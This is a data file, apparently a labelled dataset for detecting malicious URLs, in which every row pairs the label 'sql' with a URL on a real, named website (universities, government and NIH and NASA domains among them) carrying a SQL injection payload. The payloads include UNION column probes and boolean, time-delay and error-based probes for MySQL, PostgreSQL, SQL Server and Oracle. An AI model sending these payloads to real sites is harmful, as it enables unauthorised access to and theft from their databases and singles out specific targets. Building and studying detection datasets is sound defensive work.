+227,sql,http://www.icehalo.ca/products.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- vGXN
+228,sql,http://www.vittoria-shoes.com/prodotto.php?id=1' AND 3611=3611 AND 'oygD'='oygD
+229,sql,http://mkogan.com/duty.php?id=1 AND 3611=3611
+230,sql,https://koreamed.org/JournalVolume.php?id=1 AND SLEEP(5)-- THvg
+231,sql,http://www.skytraktravel.com/services.php?id=1) AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND (2513=2513
+232,sql,http://www.uba.ar/academicos/uba21/contenidos.php?id=1) AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (6121=6121
+233,sql,http://www.isconshanghai.org/web/page.php?id=1) ORDER BY 1-- zRhc
+234,sql,https://www.id.ee/index.php?id=1' UNION ALL SELECT NULL,NULL-- ViPr
+236,sql,http://pastelspace.com/collection.php?id=1 UNION ALL SELECT NULL-- uRNf
+237,sql,https://www.sjs.org.hk/en/services/services.php?id=1.8ChSI
+238,sql,http://maximaaa.com/mform/view.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dLhL
+239,sql,http://www.echmb.com/about_details.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- WGMa
+240,sql,https://toxtown.nlm.nih.gov/text_version/chemicals.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- vGXN
+241,sql,http://www.med.muni.cz/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- rjiF
+242,sql,http://len-zoloto.ru/index.php?id=1' AND 3611=3611 AND 'oygD'='oygD
+244,sql,http://www.nordiqc.org/epitope.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- mqyP
+245,sql,http://meninositu.com.br/galeria/album.php?id=1);WAITFOR DELAY '0:0:5'--
+246,sql,https://www.nttgroup.co.za/proc/dealer_detail.php?id=1%';SELECT PG_SLEEP(5)--
+247,sql,http://www.hold.com.tw/product.php?id=1 AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)))
+248,sql,http://www.catsg.org/index.php?id=5845
+249,sql,http://www.theurbanrange.com/poet.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- qwPK
+250,sql,http://www.markzaid.com/biography.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)-- jIbI
+251,sql,http://www.markdrum.it/product_detail.php?id=1 WAITFOR DELAY '0:0:5'
+252,sql,http://www.madisonpac.com/key_details.php?id=1') AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND ('VgiB'='VgiB
+253,sql,http://pyb.co.uk/cakes-detail.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IKMj
+254,sql,http://www.dengy-vsem.ru/prokrizis_vid.php?id=1') AND SLEEP(5) AND ('GJyr'='GJyr
+255,sql,http://one-thebrand.com/cart.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- GgCj
+256,sql,https://www.studyastronomy.com/courses.php?id=1) AND 3611=3611 AND (5554=5554
+257,sql,http://kyoukaigun.jp/visit/detail.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- Dvxx
+258,sql,http://www.traditionalcottages.gr/page.php?id=6787
+259,sql,https://primes.utm.edu/top20/page.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- Syfp
+260,sql,http://www.strategictransitions.com/productDetail.php?id=1 UNION ALL SELECT NULL,NULL-- sopn
+261,sql,http://www.signsinthecity.net/info.php?id=(SELECT CONCAT(0x71766a6271,(SELECT (ELT(3360=3360,1))),0x7171717871))
+262,sql,http://www.wsid.info/mod/page/view.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hrdu
+263,sql,http://www.walpax.com.br/beachresorts.php?id=1%' AND SLEEP(5) AND '%'='
+265,sql,http://www.czga.ro/pagina.php?id=1 UNION ALL SELECT NULL,NULL,NULL-- lXro
+266,sql,http://victorhospital.com/services.php?id=1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+267,sql,http://www.hrvatskonumizmatickodrustvo.hr/index.php?id=1 AND 2076=1452-- zXSW
+268,sql,http://www.medistock.fr/en/catalogue.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)
+269,sql,http://www.tunesoman.com/product.php?id=1') UNION ALL SELECT NULL,NULL,NULL-- SOSW
+270,sql,https://www.agencevu.com/photographers/photographer.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- WGMa
+271,sql,http://xn--90abdeg4afamkcabfvi7a8q.xn--p1ai/page.php?id=1) AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))) AND (1264=1264
+272,sql,https://www.becker-international.com/index.php?id=1 AND SLEEP(5)-- THvg
+273,sql,http://www.mcfolsom.com/page.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- WGMa
+274,sql,http://www.world-art.ru/people.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))
+275,sql,http://xn--n1addli.xn--p1ai/index.php?id=1') ORDER BY 4722-- epns
+276,sql,http://www.wenggroup.com/product.php?id=1%' ORDER BY 7815-- mzUV
+277,sql,https://www.cathouseonthekings.com/video/webcam.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)-- jIbI
+278,sql,http://www.pacific-textiles.com/businesses_facilities.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ApsM
+279,sql,http://www.accessibleireland.com/category.php?id=1' WAITFOR DELAY '0:0:5' AND 'cIcm'='cIcm
+280,sql,http://www.vaganova.ru/page.php?id=1) AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND (4586=4586
+281,sql,http://vill.hakuba.nagano.jp/livecam/livecamera.php?id=1' AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND 'VCNg'='VCNg
+282,sql,http://www.nagarapro.co.jp/top/artist/artist.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+283,sql,http://www.nhf.org.bd/aboutus.php?id=1';WAITFOR DELAY '0:0:5'--
+284,sql,http://www.radimpex.rs/download.php?id=1' AND 7019=2399 AND 'bmfB'='bmfB
+285,sql,https://pubgshowcase.com/containers.php?id=(SELECT CONCAT(0x71766a6271,(SELECT (ELT(3360=3360,1))),0x7171717871))
+286,sql,http://www.seehydropower.eu/download_tools/details.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- spUE
+287,sql,https://unite.ut.ee/posts.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+288,sql,http://www.arabterm.org/index.php?id=1' WAITFOR DELAY '0:0:5' AND 'cIcm'='cIcm
+289,sql,https://www.forum-pianoteq.com/viewforum.php?id=1%' ORDER BY 7815-- mzUV
+290,sql,http://www.yitechnology.com/support-faq.php?id=1 AND 3611=3611-- SJqY
+291,sql,http://www.brahmos.com/content.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)
+292,sql,https://www.flapjackfunds.com/program.php?id=1 UNION ALL SELECT NULL,NULL-- ctvb
+293,sql,http://corp.toei-anim.co.jp/en/film/pickup.php?id=1') UNION ALL SELECT NULL,NULL-- utDw
+295,sql,http://www.iias-trieste-maribor.eu/index.php?id=1) AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (6121=6121
+296,sql,http://www.m-e-l.fr/fiche-education-artistique.php?id=1 AND SLEEP(5)-- THvg
+297,sql,http://www.rancinan.com/official/photos.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aPje
+299,sql,http://www.mherc.mb.ca/page.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- WGMa
+300,sql,http://molvica.org/vesti_content.php?id=(SELECT CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5838=5838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))
+301,sql,http://www.dreamville-bg.com/ru/complex.php?id=1) AND SLEEP(5) AND (7824=7824
+302,sql,http://www.thespastudios.com/p.php?id=1%' UNION ALL SELECT NULL-- rJyU
+303,sql,https://www.i-cpan.es/detallePregunta.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ApsM
+304,sql,http://www.tomkane.com/section.php?id=1) AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND (9475=9475
+305,sql,http://www.belmos.ru/transp-artcl.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL-- atbf
+306,sql,https://74.ru/forum/view.php?id=1%' ORDER BY 7815-- mzUV
+307,sql,http://www.lecoshop.ru/dir.php?id=1 UNION ALL SELECT NULL,NULL-- sopn
+308,sql,http://www.jevicko.cz/index.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- mqyP
+309,sql,http://www.vlktravel.com/tour.php?id=1) AND SLEEP(5) AND (7824=7824
+310,sql,http://www.anm-conso.com/prof-03.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dLhL
+311,sql,https://www.filter.ru/index.php?id=1%' UNION ALL SELECT NULL-- rJyU
+312,sql,http://ohiofoodbanks.org/programs/programs.php?id=1' AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND 'MGRK'='MGRK
+314,sql,http://2017.tiff-jp.net/ja/lineup/works.php?id=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+315,sql,http://www.sriaurobindoashram.org/music/sunil/index.php?id=1'NKZqCS<'">bIRAbA
+316,sql,http://eurofo.ru/m/viewforum.php?id=1' UNION ALL SELECT NULL,NULL-- ViPr
+318,sql,http://animatch.ca/machform/view.php?id=1') AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('DVsm'='DVsm
+319,sql,http://www.sydneyshoot.com/buy.php?id=1%';WAITFOR DELAY '0:0:5'--
+320,sql,http://www.theartofdicktwinney.com/statment.php?id=1') AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))) AND ('eWKx'='eWKx
+321,sql,https://place.fi.ncsu.edu/local/catalog/section.php?id=1) AND SLEEP(5) AND (7824=7824
+322,sql,http://www2.ntnu.edu.tw/modules/tinyd0/index.php?id=(SELECT (CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)))
+323,sql,http://www.hits.pt/gca/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL-- TLHU
+324,sql,http://www.warbears.com/missions.php?id=1 UNION ALL SELECT NULL,NULL-- sopn
+325,sql,https://www.hcilondon.in/pages.php?id=(SELECT (CASE WHEN (3684=3684) THEN 3684 ELSE 3684*(SELECT 3684 FROM INFORMATION_SCHEMA.PLUGINS) END))
+326,sql,http://www.firstreception.gov.gr/content.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rvrn
+327,sql,http://www.opera-amsterdam.nl/pages.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- itKr
+331,sql,http://www.ubraintv.com/watchchannel.php?id=1') AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND ('JGjZ'='JGjZ
+332,sql,https://www.skau.sk/page.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+333,sql,https://www.tukui.org/addons.php?id=1);WAITFOR DELAY '0:0:5'--
+334,sql,http://www.semsk.kz/newscat.php?id=(SELECT (CASE WHEN (3684=3684) THEN 3684 ELSE 3684*(SELECT 3684 FROM INFORMATION_SCHEMA.PLUGINS) END))
+335,sql,http://www.msosocal.com/subpages/leadership_bio.php?id=1') WAITFOR DELAY '0:0:5' AND ('RIHg'='RIHg
+336,sql,http://pravo.ua/events.php?id=1') AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND ('JGjZ'='JGjZ
+337,sql,http://www.rainbow.com.my/support.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+338,sql,https://www.softube.com/index.php?id=(SELECT CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5838=5838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))
+339,sql,http://www.chicken.org.au/page.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BMLy
+341,sql,http://www.oardc.ohio-state.edu/weedguide/single_weed.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ntmA
+343,sql,http://bagfa.de/index.php?id=1' WAITFOR DELAY '0:0:5' AND 'cIcm'='cIcm
+344,sql,https://likumi.lv/doc.php?id=1') UNION ALL SELECT NULL,NULL,NULL-- SOSW
+345,sql,https://earthobservatory.nasa.gov/IOTD/view.php?id=1) AND 5836=4675 AND (5312=5312
+350,sql,https://www.otzyv.ru/read.php?id=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+358,sql,http://dailyjinnah.com/epaper/page.php?id=1') AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND ('JGjZ'='JGjZ
+359,sql,http://dailyjinnah.com/epaper/page.php?id=(SELECT (CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)))
+360,sql,http://dailyjinnah.com/epaper/page.php?id=(SELECT CONCAT(0x71766a6271,(SELECT (ELT(3360=3360,1))),0x7171717871))
+367,sql,https://antizapret.info/org.php?id=1' UNION ALL SELECT NULL-- lmXC
+368,sql,http://www.romanianwriters.ro/s.php?id=1 AND SLEEP(5)
+369,sql,http://www.bible-history.com/subcat.php?id=1') AND 3611=3611 AND ('xpHU'='xpHU
+370,sql,http://ruscongrmech2015.ru/index.php?id=1 UNION ALL SELECT NULL,NULL-- ctvb
+371,sql,http://berkeleyrecycling.org/page.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))
+372,sql,http://www.xrayrisk.com/calculator/calculator-normal-studies.php?id=1 WAITFOR DELAY '0:0:5'
+373,sql,http://193.232.218.56/web-local/prep/rj/index.php?id=1) UNION ALL SELECT NULL,NULL,NULL-- fqpX
+375,sql,https://www.fleurlis.com.tw/en/wedding.php?id=1) AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (6121=6121
+376,sql,http://www.dipintoguitars.com/category.php?id=1) AND SLEEP(5) AND (7824=7824
+377,sql,http://www.teamgear.us/store.php?id=1) AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))) AND (1264=1264
+378,sql,http://www.multan.gov.pk/files.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DxvE
+379,sql,http://www.asfaa.org/members.php?id=(SELECT (CASE WHEN (3684=3684) THEN 3684 ELSE 3684*(SELECT 3684 FROM INFORMATION_SCHEMA.PLUGINS) END))
+380,sql,http://www.bpc.gov.bd/contactus.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dLhL
+381,sql,https://metacarpolis.com/index.php?id=1);WAITFOR DELAY '0:0:5'--
+382,sql,http://www.jbctools.com/cataleg.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))-- Qmvu
+384,sql,http://ansobor.ru/page.php?id=1 AND 3050=5102
+385,sql,http://www.khrunichev.ru/main.php?id=1') AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('DVsm'='DVsm
+386,sql,http://www.studentvote.ca/2011/results/index.php?id=1');SELECT PG_SLEEP(5)--
+387,sql,https://www.orthphoto.net/user.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ntmA
+388,sql,http://esjindex.org/search.php?id=1%' WAITFOR DELAY '0:0:5' AND '%'='
+389,sql,http://www.sansihotels.com/hotels.php?id=1%' AND 2404=6511 AND '%'='
+390,sql,http://www.adopfrance.fr/gb/galerie/index.php?id=1) ORDER BY 1-- zRhc
+391,sql,http://www.akko.org.il/map_en.php?id=1 WAITFOR DELAY '0:0:5'-- akjU
+392,sql,http://www.paranatural.net/index.php?id=1) AND 3611=3611 AND (5554=5554
+393,sql,http://www.photobiology.org/asp.php?id=1%' UNION ALL SELECT NULL,NULL,NULL-- Lunn
+396,sql,http://www.stateofdesign.berlin/subevents.php?id=1%' WAITFOR DELAY '0:0:5' AND '%'='
+397,sql,https://www.acme.in/contentpage.php?id=1' WAITFOR DELAY '0:0:5' AND 'cIcm'='cIcm
+398,sql,http://www.komiaviatrans.ru/airport/index.php?id=1%' AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND '%'='
+399,sql,http://www.cdep.ru/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- nBvv
+400,sql,http://www.peml.com/login.php?rtn_url=http://www.peml.com/category.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sBcc
+401,sql,http://www.palfi.net/partners.php?id=1') AND 3611=3611 AND ('xpHU'='xpHU
+402,sql,http://www.sabella.fr/fiche.php?id=1%' UNION ALL SELECT NULL,NULL-- DONg
+403,sql,http://electronautomotive.com/order.php?id=1 ORDER BY 4721-- gPsZ
+404,sql,http://en.firenze-online.com/shops/florence-shop.php?id=1%' ORDER BY 7815-- mzUV
+405,sql,http://www.pidsphil.org/journal_info.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- itKr
+406,sql,http://www.egscomics.com/index.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+407,sql,https://100wonders.ru/index.php?id=1) AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND (9475=9475
+408,sql,http://www.ifsb.org/membership.php?id=1 AND SLEEP(5)-- THvg
+409,sql,https://www.ocsalumni.org/events/cart.php?id=(SELECT (CASE WHEN (9362=8798) THEN 9362 ELSE 9362*(SELECT 9362 FROM INFORMATION_SCHEMA.PLUGINS) END))
+410,sql,http://www.ssy.org/detail.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- NXUF
+411,sql,http://www.micwaudio.com/product.php?id=1 ORDER BY 1715-- vHUQ
+412,sql,http://www.smart-ground.eu/partner.php?id=1%';WAITFOR DELAY '0:0:5'--
+413,sql,http://www.lambbuilding.co.uk/members/profile.php?id=1' UNION ALL SELECT NULL,NULL-- ViPr
+414,sql,http://www.minutesemeiotic.org/home.php?id=1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+415,sql,http://pedlib.ru/katalogy/katalog.php?id=1' UNION ALL SELECT NULL,NULL-- ViPr
+416,sql,http://bestindustrygroup.com/news.php?id=1') UNION ALL SELECT NULL,NULL-- utDw
+417,sql,http://cityvis.io/detail.php?id=1) AND 5836=4675 AND (5312=5312
+418,sql,http://www.fairtradegroupnepal.org/about.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)
+419,sql,http://www.cacert.org/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- GgCj
+420,sql,http://koshi.fr/achat/produit_details.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)-- VWJB
+421,sql,http://vlab.co.in/ba_labs_all.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NonP
+422,sql,http://ewfed.com/cat.php?id=1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+423,sql,https://www.kunstreservebank.nl/index.php?id=1') ORDER BY 1-- tslS
+424,sql,http://www.cqfa.ca/public/index.php?id=1') AND SLEEP(5) AND ('GJyr'='GJyr
+425,sql,https://www.free-country-flags.com/flag_pack.php?id=(SELECT (CASE WHEN (3684=3684) THEN 3684 ELSE 3684*(SELECT 3684 FROM INFORMATION_SCHEMA.PLUGINS) END))
+426,sql,http://www.carrot-home.com/project.php?id=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+427,sql,https://www.partnerschulnetz.de/index.php?id=1);SELECT PG_SLEEP(5)--
+428,sql,https://www.albinagroup.com/products.php?id=1%' AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND '%'='
+429,sql,http://modniditky.com/katalog.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL-- zhRN
+430,sql,http://www.evanscartoons.com/gallery.php?id=1' ORDER BY 1-- Hgvf
+431,sql,http://paritarian-funds-construction.eu/page.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ntmA
+432,sql,https://www.jannah.ae/hotels.php?id=1') WAITFOR DELAY '0:0:5' AND ('RIHg'='RIHg
+433,sql,http://www.nm.cz/publikace/publikace-detail-en.php?id=1');WAITFOR DELAY '0:0:5'--
+434,sql,http://xn--149-5cd9ame0ai0a4e5b.xn--p1ai/page.php?id=1 AND SLEEP(5)-- THvg
+435,sql,http://www.daiichisankyo.co.th/aboutus.php?id=1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+436,sql,http://www.epomm.eu/maxeva/index.php?id=(SELECT (CASE WHEN (9362=8798) THEN 9362 ELSE 9362*(SELECT 9362 FROM INFORMATION_SCHEMA.PLUGINS) END))
+437,sql,http://www.skystartravels.com/gallery.php?id=1') AND SLEEP(5) AND ('GJyr'='GJyr
+439,sql,http://www.sakhalinprokur.ru/contacts.php?id=1) AND 3611=3611 AND (5554=5554
+440,sql,http://dance.vftsarr.ru/index.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- spUE
+441,sql,http://gtrkchita.ru/listen.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+442,sql,https://learnzone.org.uk/courses/course.php?id=1")))(,,)')
+443,sql,http://www.jannahplace.com/hotels.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+444,sql,http://www.rgcms.edu.in/research.php?id=1%' UNION ALL SELECT NULL-- rJyU
+445,sql,http://www.nordicbook.ru/index.php?id=1%' UNION ALL SELECT NULL,NULL-- DONg
+446,sql,https://vstomp.hotoneaudio.com/ProductsDetail.php?id=1%' ORDER BY 7815-- mzUV
+448,sql,http://www.strail.de/index.php?id=1';WAITFOR DELAY '0:0:5'--
+449,sql,http://www.ohmsghana.com/pages/services.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- vGXN
+450,sql,http://www.kvm.co.ke/products.php?id=1%' UNION ALL SELECT NULL,NULL,NULL-- Lunn
+451,sql,http://www.professor-butakov.ru/history/view_history.php?id=1%';SELECT PG_SLEEP(5)--
+452,sql,http://www.indembassy.be/pages.php?id=1 ORDER BY 1-- kzEn
+453,sql,http://www.smtmax.com/category.php?id=1 ORDER BY 1-- kzEn
+454,sql,http://www.mirraketok.ru/subs.php?id=1) AND SLEEP(5) AND (7824=7824
+455,sql,http://www.arion.ru/template.php?id=1 WAITFOR DELAY '0:0:5'
+456,sql,http://www.myappterms.com/reader.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DxvE
